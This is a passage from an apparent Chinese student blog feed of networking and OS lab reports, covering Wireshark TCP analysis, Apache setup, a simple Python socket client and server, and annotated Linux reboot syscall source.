该端口号为16位，与目的IP地址一起标识接受该TCP报文段的通信进程。<br>（3）序号（sequence number）: 占4个字节，标示TCP报文段中第一个数据字节的序号。<br>（4）确认号（acknowledgement number）: 占4个字节，标示希望收到对方下一个报文段的字节序号。<br>（5）偏移量（offset）: 告诉你数据从哪里开始（有一个偏移量）<br>（6）保留号（reserved）: 长度为6位，必须为0，为将来定义新用途保留的<br>（7）紧急（Urgent bit）: 标示该报文较为紧急，需要紧急发送<br>（8）确认（Ack bit）: 一般发送的第一个报文该号为0，为1时标示确认号字段有效<br>（9）推送（Push bit）: 标示该报文的传输优先级高，需要尽快推送给应用程序<br>（10）复位（Reset bit）: 标示需要释放TCP连接并且重新建立连接（为1时）<br>（11）同步（SYN bit）: 标示TCP请求连接（为1时）<br>（12）终止（FIN bit）: 标示数据终止发送，要求释放连接TCP连接（为1时）<br>（13）窗口（window）: 这是为了滑动窗口（sliding window）设置的，为了告诉另一端发送端的接受缓冲空间（receive buffer space）有多大<br>（14）校验和（checksum）: 16位，由发送端计算和存储，到接受端后，由接受端进行验证。<br>（15）紧急指针（urgent pointer）: 告诉你需要紧急发送的数据在哪一个部分（segment）<br>（16）选项（options）: 包含最长报文大小、窗口扩大选项等。<br>（17）填充（padding）: 必须为0，保证报头的结合和数据的开始处偏移量能够被32整除<br>接下来选取一个TCP数据包进行分析。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-TCP%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/image-20221230174219332.png" alt="image-20221230174219332"></p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-TCP%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/image-20221230174224866.png" alt="image-20221230174224866"></p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-TCP%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/image-20221230174230194.png" alt="image-20221230174230194"></p><p>该报文为一个普通的数据传输TCP报文，源端口Src Port: https (443),目的端口 Dst Port: 50069 , 序列号Seq: 47850（相对）,使用wireshark显示原始序列号，为38249967226，确认号 Ack: 1195（相对）,原始确认号为330730167， 报文长度Len: 1440，标记号中仅Acknowledgement设置为1，表示确认号字段有效。滑动窗口Window size为31360，校验和为0x2c23，紧急指针字段为00。<br>2、分析TCP三次握手。<br>①访问hdu.edu.cn并使用wireshark抓包，选中hdu的ip过滤显示tcp包。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-TCP%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/image-20221230174238283.png" alt="image-20221230174238283"></p><p>②选中TCP三次握手中的第一个数据包，即SYN数据包。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-TCP%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/image-20221230174243786.png" alt="image-20221230174243786"></p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-TCP%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/image-20221230174249158.png" alt="image-20221230174249158"></p><p>分析该数据包，发现该数据包不含数据，SYN为1，MSS为1460，是以太网帧最大取值1500减去TCP首部和IP报头部40个字节后的取值。</p><p>②选中TCP三次握手的第二个数据包。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-TCP%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/image-20221230174255816.png" alt="image-20221230174255816"></p><p>服务端向客户端发送一个SYN包并附带一个表示确认已经收到了SYN包的ACK（acknowledge）包，在wireshark中就会提示 [SYN, ACK]状态。观察报文，发现ACK与SYN位均为1，该报文同样不包含任何数据。由于IPv6中的IP头的大小是40bytes，所以本段MSS为1440。<br>③抓取TCP三次握手的第三个数据包。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-TCP%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/image-20221230174302099.png" alt="image-20221230174302099"></p><p>客户端会向server端发送一个ACK包，这个时候客户端和服务端就建立起了TCP连接。三个数据包交换完成后，双方就可以开始进行通信及数据传输。<br>3、分析TCP四次挥手。<br>①使用tcp.flags.fin&#x3D;&#x3D;1筛选挥手过程。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-TCP%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/image-20221230174307085.png" alt="image-20221230174307085"></p><p>服务器发送了一个FIN标志置位的报文段表示希望结束服务器端到客户端的数据传输，客户端给出ACK确认包并加1。然后客户端也发送一个FIN标志置位的报文段表示希望结束客户端到服务器端的数据传输，服务器端给出ACK确认包并加1。TCP四次挥手结束，断开连接。<br>4、分析TCP重置。<br>①理想情况下TCP正常关闭，但当遇到特殊情况断掉后，会使用RST标志置位的数据包指出连接异常。使用tcp.flags.reset&#x3D;&#x3D;1筛选该类型包。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-TCP%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/image-20221230174313037.png" alt="image-20221230174313037"></p><p>可以看出，RST除了RST、ACK标志置位以外没有其他信息。<br>5、TCP可靠数据传输的基本原理<br>TCP为了提供可靠传输：<br>（1）首先，采用三次握手来建立TCP连接，四次握手来释放TCP连接，从而保证建立的传输信道是可靠的。<br>（2）其次，TCP采用了连续ARQ协议（回退N，Go-back-N；超时自动重传）来保证数据传输的正确性，使用滑动窗口协议来保证接方能够及时处理所接收到的数据，进行流量控制。ARQ协议，即自动重传请求（Automatic Repeat-reQuest），是OSI模型中数据链路层和传输层的错误纠正协议之一。它通过使用确认和超时这两个机制，在不可靠服务的基础上实现可靠的信息传输。如果发送方在发送后一段时间之内没有收到确认帧，它通常会重新发送。ARQ包括停止等待ARQ协议和连续ARQ协议，拥有错误检测（Error Detection）、正面确认（Positive Acknowledgment）、超时重传（Retransmission after Timeout）和 负面确认及重传（Negative Acknowledgment and Retransmission）等机制。<br>（3）最后，TCP使用慢开始、拥塞避免、快重传和快恢复来进行拥塞控制，避免网络拥塞。<br>网络拥塞是指在分组交换网络中传送分组的数目太多时，由于存储转发节点的资源有限而造成网络传输性能下降的情况。当网络发生拥塞时，一般会出现数据丢失，时延增加，吞吐量下降，严重时甚至会导致“拥塞崩溃”（congestion collapse）。拥塞控制就是对发送方拥塞窗口cwnd的调整，TCP常用的拥塞控制有： 1. 慢开始、拥塞控制 2. 快重传、快恢复。</p>]]></content>
    
    
    <categories>
      
      <category>计算机网络-HDU</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络-ApacheWeb服务器安装配置</title>
    <link href="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-ApacheWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"/>
    <url>/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-ApacheWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="ApacheWeb服务器安装配置"><a href="#ApacheWeb服务器安装配置" class="headerlink" title="ApacheWeb服务器安装配置"></a>ApacheWeb服务器安装配置</h1><h3 id="实验目的："><a href="#实验目的：" class="headerlink" title="实验目的："></a>实验目的：</h3><p>1.学会Apache服务器的下载、配置以及使用；<br>2.学会Apache形成的页面的修改以及url的修改。</p><h3 id="实验环境说明："><a href="#实验环境说明：" class="headerlink" title="实验环境说明："></a>实验环境说明：</h3><p>Windows、Apache</p><h3 id="实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果："><a href="#实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果：" class="headerlink" title="实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果："></a>实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果：</h3><p>1、安装并配置Apache服务器<br>①下载Apache。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-ApacheWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/image-20221230173700879.png" alt="image-20221230173700879"></p><p>②解压缩后修改conf文件的路径配置</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-ApacheWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/image-20221230173707613.png" alt="image-20221230173707613"></p><p>③测试conf配置格式是否合法</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-ApacheWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/image-20221230173713506.png" alt="image-20221230173713506"></p><p>④安装Apache</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-ApacheWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/image-20221230173717223.png" alt="image-20221230173717223"></p><p>发现端口被占用，修改配置默认端口为444</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-ApacheWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/image-20221230173722768.png" alt="image-20221230173722768"></p><p>⑤启动服务</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-ApacheWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/image-20221230173728940.png" alt="image-20221230173728940"></p><p>⑥测试，浏览器访问<a href="http://localhost,配置成功./">http://localhost，配置成功。</a></p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-ApacheWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/image-20221230173733549.png" alt="image-20221230173733549"></p><p>2、修改基础页面及URL。<br>①打开htdocs中的index.html并修改。</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-ApacheWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/image-20221230173737742.png" alt="image-20221230173737742"></p><p>②修改index的目录</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-ApacheWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/image-20221230173742926.png" alt="image-20221230173742926"></p><p>③访问URL即获取页面</p>]]></content>
    
    
    <categories>
      
      <category>计算机网络-HDU</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络-socket程序设计</title>
    <link href="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-socket%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    <url>/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-socket%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="实验名称：SOCKET-网络程序设计"><a href="#实验名称：SOCKET-网络程序设计" class="headerlink" title="实验名称：SOCKET 网络程序设计"></a>实验名称：SOCKET 网络程序设计</h1><h3 id="实验目的与要求："><a href="#实验目的与要求：" class="headerlink" title="实验目的与要求："></a>实验目的与要求：</h3><p>•理解进程通信的原理及通信过程；<br>•掌握基本的网络编程方法；<br>•需要有流程图；<br>•需要抓取传输内容，比如“你的名字和学号”；<br>•实现并发服务器。</p><h3 id="实验环境说明："><a href="#实验环境说明：" class="headerlink" title="实验环境说明："></a>实验环境说明：</h3><p>Pycharm、wireshark、RawCap</p><h3 id="实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果："><a href="#实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果：" class="headerlink" title="实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果："></a>实验过程、步骤（可另附页、使用网络拓扑图等辅助说明）及结果：</h3><p>先画流程图：</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-socket%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20221230115058372.png" alt="image-20221230115058372"></p><p>编写server.py：</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-socket%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20221230115104402.png" alt="image-20221230115104402"></p><p>编写client.py:</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-socket%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20221230115111776.png" alt="image-20221230115111776"></p><p>启动server后启动client，查看运行结果：</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-socket%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20221230115120350.png" alt="image-20221230115120350"></p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-socket%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20221230115144481.png" alt="image-20221230115144481"></p><p>可以看出，client连接目标端口后，server将client的地址信息打印出来，同时向client发送信息，client接收后向Server发送信息，均能成功接收，完成所有任务后server关闭连接。<br>接下来使用wireshark对本地回环进行抓包，由于本实验的server和client均是建立在本地主机上的，默认的Wincap无法抓本地回环包，在上网查阅资料后发现可以使用RawCap+wireshark来抓本地回环包。<br>下载并安装RawCap：</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-socket%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20221230115155108.png" alt="image-20221230115155108"></p><p>使用wireshark抓取Loopback网卡包，指定端口为目标端口12345：</p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-socket%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20221230115201158.png" alt="image-20221230115201158"></p><p><img src="/2022/12/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-socket%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20221230115207650.png" alt="image-20221230115207650"></p><p>发现成功抓取server和client之间的信息传输内容，其中中文部分由于编码原因，没有显示。</p><p>附程序代码：<br>Server.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">-*- coding: UTF-<span class="hljs-number">8</span> -*-<br><br><span class="hljs-keyword">import</span> socket  <span class="hljs-comment"># 导入 socket 模块</span><br><br>s = socket.socket()  <span class="hljs-comment"># 创建 socket 对象</span><br>host = socket.gethostname()  <span class="hljs-comment"># 获取本地主机名</span><br>port = <span class="hljs-number">12345</span>  <span class="hljs-comment"># 设置端口</span><br>s.bind((host, port))  <span class="hljs-comment"># 绑定端口</span><br><br>s.listen(<span class="hljs-number">5</span>)  <span class="hljs-comment"># 等待客户端连接</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    c, addr = s.accept()  <span class="hljs-comment"># 建立客户端连接</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;连接地址：&#x27;</span>, addr)<br>    c.send(<span class="hljs-built_in">bytes</span>(<span class="hljs-string">&#x27;欢迎访问曹嘉美_20052201_Server！&#x27;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(c.recv(<span class="hljs-number">1024</span>),encoding=<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    c.close()  <span class="hljs-comment"># 关闭连接</span><br></code></pre></td></tr></table></figure><p>Client.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket  <span class="hljs-comment"># 导入 socket 模块</span><br><br>s = socket.socket()  <span class="hljs-comment"># 创建 socket 对象</span><br>host = socket.gethostname()  <span class="hljs-comment"># 获取本地主机名</span><br>port = <span class="hljs-number">12345</span>  <span class="hljs-comment"># 设置端口号</span><br><br>s.connect((host, port))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(s.recv(<span class="hljs-number">1024</span>),encoding=<span class="hljs-string">&quot;utf-8&quot;</span>))<br>s.send(<span class="hljs-built_in">bytes</span>(<span class="hljs-string">&quot;client：曹嘉美_20052201&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>))<br>s.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>计算机网络-HDU</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络-Wireshark实验</title>
    <link href="/2022/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-Wireshark%E5%AE%9E%E9%AA%8C/"/>
    <url>/2022/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-Wireshark%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<p> 实验设备和环境：<img src="/2022/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-Wireshark%E5%AE%9E%E9%AA%8C/wps1.jpg" alt="wps1.jpg"> </p><p> 实验过程及步骤：（给出相应的实验环境拓扑图和实验说明，可另附页）</p><p>1） 根据实验拓扑图完成实验环境的搭建；</p><p>2） 根据相关信息进行网络配置，此处可以自己发挥，并可以故意设置错误，通过抓包来分析错误的原因，并解决此问题；</p><p><img src="/2022/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-Wireshark%E5%AE%9E%E9%AA%8C/wps2.jpg" alt="img"> </p><p><img src="/2022/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-Wireshark%E5%AE%9E%E9%AA%8C/wps3.jpg" alt="img"> </p><p>一开始尝试使用pc对<a href="http://www.jd.com测试ping命令未果,发现是由于混淆http和dns服务器,将dns地址设置为了http服务器的ip./">www.jd.com测试ping命令未果，发现是由于混淆HTTP和DNS服务器，将DNS地址设置为了HTTP服务器的ip。</a></p><p>3） 完成web服务器的设置：</p><p><img src="/2022/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-Wireshark%E5%AE%9E%E9%AA%8C/wps4.jpg" alt="img"> </p><p>4） 完成DNS的设置：</p><p> <img src="/2022/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-Wireshark%E5%AE%9E%E9%AA%8C/wps5.jpg" alt="img"> </p><p>5） 抓取浏览器的数据，观察DNS服务器及web服务器开启和没开启时的数据有何不同，并进行简单的解释说明；</p><p>①未开启DNS和web服务器时，使用浏览器发送请求：</p><p><img src="/2022/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-Wireshark%E5%AE%9E%E9%AA%8C/wps6.jpg" alt="img"> </p><p>广播查找DNS服务器未果。</p><p>②仅开启DNS服务器</p><p><img src="/2022/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-Wireshark%E5%AE%9E%E9%AA%8C/wps7.jpg" alt="img"> </p><p>可从DNS服务器获取目标域名的IP地址，但广播无法找到HTTP服务器。</p><p>③开启DNS和web服务器后，使用浏览器发送请求：</p><p><img src="/2022/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-Wireshark%E5%AE%9E%E9%AA%8C/wps8.jpg" alt="img"> </p><p>浏览器通过DNS获得jd.com的ip地址后，向目标ip进行TCP三次握手，随后发送HTTP报文并获取响应报文获取资源，最后进行TCP四次挥手。</p><p>6） 分析HTTP协议，了解应用层协议实现的一些细节问题。使用浏览器请求网页：<img src="/2022/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-Wireshark%E5%AE%9E%E9%AA%8C/wps9.jpg" alt="img"></p><p>成功接收到jd.html</p><p><img src="/2022/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-Wireshark%E5%AE%9E%E9%AA%8C/wps10.jpg" alt="img"> </p><p>查看HTTP报文数据并分析：</p><p><img src="/2022/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-Wireshark%E5%AE%9E%E9%AA%8C/wps11.jpg" alt="img"> </p><p>①请求报文由请求行、首部行组成。请求行有三个字段，分别是方法字段GET、URL字段&#x2F;jd.html、HTTP协议版本字段1.1。首部行分别说明了Accept-language、User-Agent、Accept-Encoding、Host、Connection方法等，由于请求报文使用了GET方法，因此报文实体体为空，因此该报文仅含报文头，为163bytes。加上TCP、IP、链路层首部共54bytes，一共217bytes。</p><p><img src="/2022/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-Wireshark%E5%AE%9E%E9%AA%8C/wps12.jpg" alt="img"> </p><p><img src="/2022/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-Wireshark%E5%AE%9E%E9%AA%8C/wps13.jpg" alt="img"> </p><p>②经过一系列的TCP对数据资源进行传输后，服务端发送HTTP响应报文，响应报文由初始状态行、首部行、实体体组成。初始状态行包含HTTP协议版本1.1、状态码200表示请求成功，消息在返回的响应报文中、相应状态信息OK。首部行分别说明了Server、Auth、Cache-Control、Content-Type、Content-Length等，实体体为传输的数据，长度为546103bytes。该响应报文头长度为131bytes，由于资源由TCP分片传输，选中查看TCP传输的所有数据，整个HTTP报文一共546103+131&#x3D;546234bytes。 </p>]]></content>
    
    
    <categories>
      
      <category>计算机网络-HDU</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>系统重启-Linux内核源码阅读</title>
    <link href="/2022/12/15/%E7%B3%BB%E7%BB%9F%E9%87%8D%E5%90%AF-Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    <url>/2022/12/15/%E7%B3%BB%E7%BB%9F%E9%87%8D%E5%90%AF-Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/</url>
    
    <content type="html"><![CDATA[<p>关于OS课程的内核系统调用实验题目，需要阅读系统重启、计时器相关内核源码，主要参考网站：</p><p><a href="https://elixir.bootlin.com/linux/v5.4.218/C/ident/reboot">https://elixir.bootlin.com/linux/v5.4.218/C/ident/reboot</a></p><h1 id="reboot函数"><a href="#reboot函数" class="headerlink" title="reboot函数"></a>reboot函数</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//magic数：用于防止误操作</span><br><span class="hljs-comment">//cmd：字符串，用于指定reboot方式</span><br>SYSCALL_DEFINE4(reboot, <span class="hljs-type">int</span>, magic1, <span class="hljs-type">int</span>, magic2, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, cmd,<br><span class="hljs-type">void</span> __user *, arg)<br>&#123;<br>    <span class="hljs-comment">//获取当前进程命名空间</span><br>    <span class="hljs-comment">//task_active_pid_ns函数</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid_namespace</span> *<span class="hljs-title">pid_ns</span> =</span> task_active_pid_ns(current);<br><span class="hljs-type">char</span> buffer[<span class="hljs-number">256</span>];<br><span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>; <br><br>    <span class="hljs-comment">//判断权限</span><br>    <br>    <span class="hljs-comment">//判断该任务的ns中的用户ns是否拥有CAP_SYS_BOOT的权限</span><br>    <span class="hljs-comment">/*CAP_SYS_BOOT 表示允许使用 reboot() */</span><br>    <span class="hljs-comment">//#define EPERM  1 /* 允许操作 */</span><br><span class="hljs-keyword">if</span> (!ns_capable(pid_ns-&gt;user_ns, CAP_SYS_BOOT))<br><span class="hljs-keyword">return</span> -EPERM;<br>   <br><span class="hljs-comment">//magic number:魔数，这是放在linux的目录中的文件信息块中的一个标识符，一般只有几位，用来标识该文件是什么类型的文件，可以被什么样的应用使用。</span><br><span class="hljs-comment">/* For safety, we require &quot;magic&quot; arguments. */</span><br><span class="hljs-keyword">if</span> (magic1 != LINUX_REBOOT_MAGIC1 ||<br>(magic2 != LINUX_REBOOT_MAGIC2 &amp;&amp;<br>magic2 != LINUX_REBOOT_MAGIC2A &amp;&amp;<br>magic2 != LINUX_REBOOT_MAGIC2B &amp;&amp;<br>magic2 != LINUX_REBOOT_MAGIC2C))<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-comment">//#define EINVAL 22 /* 无效参数 */</span><br><br><span class="hljs-comment">/*重启ns，成功时返回0</span><br><span class="hljs-comment"> * If pid namespaces are enabled and the current task is in a child</span><br><span class="hljs-comment"> * pid_namespace, the command is handled by reboot_pid_ns() which will</span><br><span class="hljs-comment"> * call do_exit().</span><br><span class="hljs-comment"> */</span><br>ret = reboot_pid_ns(pid_ns, cmd);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><br><span 